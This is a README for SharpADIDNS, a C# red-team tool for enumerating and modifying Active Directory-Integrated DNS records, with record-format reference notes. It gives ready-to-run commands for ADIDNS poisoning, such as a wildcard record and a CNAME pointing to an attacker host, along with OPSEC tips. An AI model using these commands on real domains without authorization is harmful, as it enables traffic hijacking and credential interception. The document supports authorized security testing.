# SharpADIDNS

C# command-line tool for reading and modifying Active Directory-Integrated DNS (ADIDNS) records over LDAP.

Built around `System.DirectoryServices`. Targets .NET Framework 4.x and produces a small standalone `.exe`. Intended for authorized red team / pentest engagements and lab work.

## Capabilities

| Action  | Description |
| ------- | ----------- |
| enum    | List every `dnsNode` under a zone, with type and value summary |
| query   | Read one node and decode each `dnsRecord` blob in detail |
| add     | Create or update a record (A, AAAA, CNAME, TXT, or raw blob) |
| disable | Tombstone the node (soft delete; object stays in AD) |
| remove  | Hard-delete the `dnsNode` object |

Record builders implement the `DNS_RPC_RECORD` structure from [MS-DNSP] and the `DNS_COUNT_NAME` label encoding used for CNAME / PTR / NS.

## Build

Requires .NET Framework 4.x. From a Developer Command Prompt, or pointing directly at `csc.exe`:

```
csc /optimize+ /r:System.DirectoryServices.dll /out:SharpADIDNS.exe SharpADIDNS.cs
```

`csc.exe` ships with the OS at:

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
```

No third-party dependencies. A prebuilt binary tracking the current commit is provided under `release/SharpADIDNS.exe`.

## Usage

```
SharpADIDNS.exe <action> [options]
```

### Targeting

| Option | Description |
| ------ | ----------- |
| `--zone <fqdn>`       | DNS zone, e.g. `redteamnotes.local` (required) |
| `--name <label>`      | Record name; `@` = apex, `*` = wildcard (required, except for `enum`) |
| `--domain-dn <DN>`    | Naming context, e.g. `DC=redteamnotes,DC=local` (required) |
| `--partition <name>`  | `DomainDnsZones` (default) / `ForestDnsZones` / `System` |
| `--server <host>`     | Target DC FQDN or IP. Omit for serverless bind. |

### Record data (`add` only)

| Option | Description |
| ------ | ----------- |
| `--type <T>`     | `A` / `AAAA` / `CNAME` / `TXT` (default: `A`) |
| `--data <value>` | IP for A/AAAA, FQDN for CNAME, text for TXT. Alias: `--ip` |
| `--raw <base64>` | Pre-built `dnsRecord` blob; bypasses `--type` / `--data` |
| `--ttl <sec>`    | 1..604800 (default: 600) |
| `--force`        | Replace records of the same type on an existing node. Records of other types on the same node are preserved. |

### Authentication

| Option | Description |
| ------ | ----------- |
| `--username <user>` | UPN or `DOMAIN\user`. Default: current process token. |
| `--password <pwd>`  | Cleartext password. Required with `--username`. |
| `--ldaps`           | Bind over LDAPS (port 636) |

### Output

| Option | Description |
| ------ | ----------- |
| `-v`, `--verbose` | Print DNs, raw blobs, bind details |
| `-q`, `--quiet`   | Suppress `[*]` info lines |
| `-h`, `--help`    | Show full help |

### Exit codes

| Code | Meaning |
| ---- | ------- |
| 0 | Success |
| 1 | Usage / argument error |
| 2 | LDAP / AD operation failed (see stderr for `ExtendedError`) |
| 3 | Target object not found |
| 4 | Access denied |

## Examples

```powershell
# Enumerate every node in a zone
SharpADIDNS.exe enum --zone redteamnotes.local --domain-dn DC=redteamnotes,DC=local --server dc.redteamnotes.local

# Read one record and decode all blobs on it
SharpADIDNS.exe query --zone redteamnotes.local --name sccm --domain-dn DC=redteamnotes,DC=local

# Inject a wildcard A record (classic ADIDNS poisoning)
SharpADIDNS.exe add --zone redteamnotes.local --name "*" --type A --data 10.0.0.66 --domain-dn DC=redteamnotes,DC=local --ttl 600

# Add an AAAA record with explicit credentials over LDAPS
SharpADIDNS.exe add --zone redteamnotes.local --name web --type AAAA --data fe80::1 --domain-dn DC=redteamnotes,DC=local --server dc.redteamnotes.local --username redteamnotes\alice --password 'P@ss' --ldaps

# Add a CNAME (preserves any A/AAAA already on the node when used with --force)
SharpADIDNS.exe add --zone redteamnotes.local --name printer --type CNAME --data attacker.redteamnotes.local --domain-dn DC=redteamnotes,DC=local --force

# Tombstone a node instead of hard-deleting it
SharpADIDNS.exe disable --zone redteamnotes.local --name wpad --domain-dn DC=redteamnotes,DC=local

# Inject a pre-built record (e.g. for non-standard types or PoC reproduction)
SharpADIDNS.exe add --zone redteamnotes.local --name custom --raw BASE64_DNSRECORD_BLOB --domain-dn DC=redteamnotes,DC=local --force
```

## Notes

- Any authenticated domain user can create new `dnsNode` objects by default. Existing nodes are owned by their creator; modifying or removing them requires explicit ACEs (creator, `DnsAdmins`, or a delegated ACL).
- `wpad` and `isatap` are blocked by the DNS server's Global Query Block List (GQBL) since Server 2008. The record will be written to AD but the DNS server refuses to answer queries for those names. GQBL is a DNS server registry setting (`HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\GlobalQueryBlockList`) and is not visible via LDAP.
- `disable` is more OPSEC-friendly than `remove`: the object stays in AD with `dNSTombstoned=TRUE` and is scavenged by AD after the `DsTombstoneInterval` (default 14 days on Server 2008+).
- Wildcard (`*`) records hijack every unresolved name in the zone. Run `enum` first to confirm you are not stomping legitimate data.
- `--force` replaces records of the **same type** on the target node; records of other types on the same node are kept. To wipe everything, use `disable` or `remove` first.

## Record format reference

Every `dnsRecord` value is a `DNS_RPC_RECORD` blob:

```
offset  size  field
0       2     DataLength       (little-endian)
2       2     Type             (little-endian)
4       1     Version          (= 0x05)
5       1     Rank             (0xF0 = DNS_RANK_ZONE for AD-integrated)
6       2     Flags            (little-endian)
8       4     Serial           (little-endian)
12      4     TTL              (BIG-endian)
16      4     Reserved
20      4     Timestamp        (hours since 1601-01-01; 0 = static)
24      N     Type-specific data
```

Type-specific data:

- A (1): 4 bytes IPv4
- AAAA (28): 16 bytes IPv6
- CNAME (5) / PTR (12) / NS (2): `DNS_COUNT_NAME`
- TXT (16): length-prefixed ASCII string(s)
- TS (0, tombstone): 8 bytes `EntombedTime` FILETIME (little-endian)

`DNS_COUNT_NAME` for `foo.bar.example`:

```
[0x11][0x03][0x03]foo[0x03]bar[0x07]example[0x00]
  ^     ^
  |     LabelCount (3)
  cchNameLength (17 = label data including trailing 0x00)
```

## References

- [MS-DNSP] Domain Name Service (DNS) Server Management Protocol
- Powermad (Kevin Robertson) — PowerShell ADIDNS toolkit
- krbrelayx / dnstool.py (dirkjanm) — Python ADIDNS toolkit

## Disclaimer

For use in authorized security assessments, CTFs, and lab environments only. The author assumes no responsibility for misuse.
